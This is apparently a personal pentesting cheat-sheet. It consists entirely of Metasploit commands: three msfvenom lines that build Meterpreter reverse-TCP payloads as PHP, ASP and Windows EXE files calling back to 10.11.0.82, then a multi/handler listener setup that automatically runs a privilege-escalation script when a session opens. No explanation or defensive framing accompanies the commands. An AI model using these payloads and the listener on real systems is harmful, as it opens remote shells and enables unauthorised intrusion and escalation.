msfvenom -p php/meterpreter/reverse_tcp LHOST=10.11.0.82 LPORT=12345 > $FILE
msfvenom -p windows/meterpreter/reverse_tcp -o test.asp -f asp
msfvenom -p windows/meterpreter/reverse_tcp -o rsh.exe -f exe LHOST=10.11.0.82 LPORT=443

use exploit/multi/handler
set LHOST 10.11.0.82
set LPORT 12345
set payload php/meterpreter/reverse_tcp
set AutoRunScript multi_console_command -rc escalate.rc
exploit